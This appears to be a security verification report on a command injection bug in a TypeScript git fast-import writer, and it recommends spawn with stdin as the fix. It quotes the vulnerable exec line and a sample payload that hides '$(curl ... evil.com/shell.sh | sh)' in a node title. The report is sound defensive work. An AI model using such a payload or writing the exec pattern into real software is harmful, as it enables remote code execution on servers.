# Verification Report: Orphan Branch Protocol (Command Injection)
- **Date**: 2026-06-25
- **Phase & Item**: Phase 7 - Orphan Branch R/W Protocol
- **Target File**: artifacts/api-server/src/lib/orphan-branch-writer.ts
- **Status Update Required**: ❌ ERROR

### Description of Failure
The code uses `node:child_process` `exec` to pipe data into `git fast-import`:
```typescript
await execAsync(`printf '%s' ${JSON.stringify(fastImportData)} | git fast-import --quiet`);
```
`JSON.stringify` wraps the output in double quotes (`"..."`) and escapes internal double quotes, but it **does not escape bash command substitution characters** like `$` or backticks. In standard Unix shells, text inside double quotes is evaluated for command substitution. 

An attacker can create an L3 node with the title or content set to `$(curl -s http://evil.com/shell.sh | sh)`. When `JSON.stringify` drops this into the `exec` string, the shell sees `"...\n$(curl -s http://evil.com/shell.sh | sh)\n..."` and executes the arbitrary command on the host server.

### Recommended Fix
Never use `exec` for data streams. Use `spawn('git', ['fast-import', '--quiet'])` and pipe `fastImportData` programmatically into the child process's `stdin` to completely bypass shell interpretation.
